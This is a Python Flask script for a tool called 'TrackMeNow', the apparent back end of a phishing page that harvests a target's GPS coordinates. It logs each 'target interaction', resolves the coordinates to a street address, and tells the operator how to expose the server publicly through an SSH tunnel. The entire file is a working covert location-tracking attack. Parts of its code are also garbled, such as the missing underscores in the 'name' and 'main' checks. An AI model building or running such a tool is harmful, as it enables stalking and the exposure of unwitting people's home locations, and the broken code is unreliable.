import os
import subprocess
from flask import Flask, render_template, request, jsonify
from geopy.geocoders import Nominatim

app = Flask(name)

# Geopy OSINT Module Initialization
geolocator = Nominatim(user_agent="TrackMeNow_OSINT_Engine")

@app.route('/')
def index():
    # UI Render
    return render_template('index.html')

@app.route('/update_location', methods=['POST'])
def update_location():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No data received"}), 400

        latitude = data.get('latitude')
        longitude = data.get('longitude')

        if latitude and longitude:
            print("\n" + "="*50)
            print(f"[+] TARGET INTERACTION DETECTED!")
            print(f"[*] Latitude  : {latitude}")
            print(f"[*] Longitude : {longitude}")
            print(f"[*] Maps Link : https://maps.google.com/?q={latitude},{longitude}")
            
            # Reverse Geocoding to fetch full street address
            try:
                location = geolocator.reverse((latitude, longitude), timeout=10)
                if location:
                    print(f"[+] Full Address: {location.address}")
                else:
                    print("[-] Address: Unable to resolve street name.")
            except Exception as geo_err:
                print(f"[-] Geocoding Error: {str(geo_err)}")
            print("="*50 + "\n")
            
            return jsonify({"status": "success", "message": "Payload delivered"}), 200
        else:
            return jsonify({"status": "error", "message": "Missing coordinates"}), 400

    except Exception as e:
        print(f"[-] Server Error: {str(e)}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500

def check_and_generate_certificates():
    cert_path = "cert.pem"
    key_path = "key.pem"
    script_path = "./generate_cert.sh"

    # If certificates don't exist, execute the generator script automatically
    if not os.path.exists(cert_path) or not os.path.exists(key_path):
        print("[*] SSL Certificates missing. Triggering auto-generation script...")
        if os.path.exists(script_path):
            try:
                subprocess.run(["chmod", "+x", script_path], check=True)
                subprocess.run([script_path], check=True)
                print("[+] SSL Certificates generated successfully.")
            except Exception as e:
                print(f"[-] Failed to execute certificate script: {e}")
        else:
            print("[-] Error: generate_cert.sh not found. Running in HTTP mode.")
    return os.path.exists(cert_path) and os.path.exists(key_path)

if name == 'main':
    print("\n" + "="*50)
    print("      TRACKMENOW: SECURE OSINT ENGINE v1.0.3      ")
    print("="*50)
    
    # Check for SSL Configuration
    has_certs = check_and_generate_certificates()
    
    # Multi-compatibility runtime logic
    # It listens globally on port 5000 and adapts to both HTTP & HTTPS requests safely
    if has_certs:
        print("[+] SSL/TLS Layer configured with self-signed certificates.")
        print("[*] Local Access (Your Device): https://127.0.0.1:5000")
        print("[*] Public Tunnel Mode Enabled: Run 'ssh -R 80:localhost:5000 localhost.run'")
        
        # Dual Compatibility Engine
        app.run(
            host='0.0.0.0', 
            port=5000, 
            ssl_context=('cert.pem', 'key.pem'), 
            debug=True
        )
    else:
        print("[!] Running in Standard HTTP Mode due to missing SSL keys.")
        app.run(
            host='0.0.0.0', 
            port=5000, 
            debug=True
        )